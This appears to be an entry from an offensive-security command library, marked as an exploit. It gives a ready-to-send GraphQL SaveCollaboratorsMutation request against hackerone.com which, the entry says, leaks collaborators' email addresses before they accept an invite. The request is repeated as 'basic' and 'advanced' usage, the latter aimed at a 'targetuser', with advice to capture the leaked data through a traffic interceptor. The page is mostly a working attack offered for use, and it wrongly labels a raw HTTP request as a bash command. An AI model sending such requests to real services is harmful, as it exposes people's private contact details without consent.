---
data: >-
  POST /graphql HTTP/2

  Host: hackerone.com

  {"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation
  SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n
  saveCollaborators(input: $input) {\n was_successful\n errors {\n edges {\n
  node {\n message\n __typename\n }\n __typename\n }\n __typename\n }\n
  __typename\n }\n}\n"}
tags:
  - graphql
  - exploit
type: command
executor: bash
platforms:
  - Web
id: 96b3184e-f3a9-445b-b706-7f6ef40abc84
created_at: '2025-12-11T03:47:56.286Z'
updated_at: '2025-12-11T03:47:56.286Z'
verified: false
validated: true
submitted: true
---
---
id: command-001
name: graphql-save-collaborators-mutation
type: command
executor: bash
data: |
  POST /graphql HTTP/2
Host: hackerone.com
{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n saveCollaborators(input: $input) {\n was_successful\n errors {\n edges {\n node {\n message\n __typename\n }\n __typename\n }\n __typename\n }\n __typename\n }\n}\n"}
output: null
created_at: 2023-11-01T00:00:00Z
updated_at: 2023-11-01T00:00:00Z
platforms: []
tags: []
---

# graphql-save-collaborators-mutation

## Command

```bash
POST /graphql HTTP/2
Host: hackerone.com
{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999},{"username_or_email":"███████","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n saveCollaborators(input: $input) {\n was_successful\n errors {\n edges {\n node {\n message\n __typename\n }\n __typename\n }\n __typename\n }\n __typename\n }\n}\n"}
```

## Description

Sends a GraphQL mutation to save collaborators on a HackerOne report, which leaks email addresses in the payload even before invite acceptance. Use this in conjunction with a traffic interceptor to capture and view the leaked information.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `operationName` | Specifies the mutation name SaveCollaboratorsMutation | Yes |
| `variables` | Contains input with report_id, collaborators array including username_or_email and bounty_weight | Yes |
| `query` | The GraphQL query string for the mutation | Yes |

## Examples

### Basic Usage

```bash
POST /graphql HTTP/2
Host: hackerone.com
{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n saveCollaborators(input: $input) {\n was_successful\n errors {\n edges {\n node {\n message\n __typename\n }\n __typename\n }\n __typename\n }\n __typename\n }\n}\n"}
```

### Advanced Usage

```bash
POST /graphql HTTP/2
Host: hackerone.com
{"operationName":"SaveCollaboratorsMutation","variables":{"input":{"report_id":2032701,"collaborators":[{"username_or_email":"testmealways","bounty_weight":0.9989999999999999},{"username_or_email":"targetuser","bounty_weight":0.9989999999999999}]},"product_area":"collaboration","product_feature":"save_collaborators"},"query":"mutation SaveCollaboratorsMutation($input: SaveCollaboratorsMutationInput!) {\n saveCollaborators(input: $input) {\n was_successful\n errors {\n edges {\n node {\n message\n __typename\n }\n __typename\n }\n __typename\n }\n __typename\n }\n}\n"}
```

## Expected Output

Response containing was_successful and possibly errors, but the request payload itself leaks the emails in the username_or_email fields.

## Related

- [[procedures/Exploit-GraphQL-SaveCollaboratorsMutation-for-Email-Disclosure]]
- [[tools/HTTP-Traffic-Interceptor]]
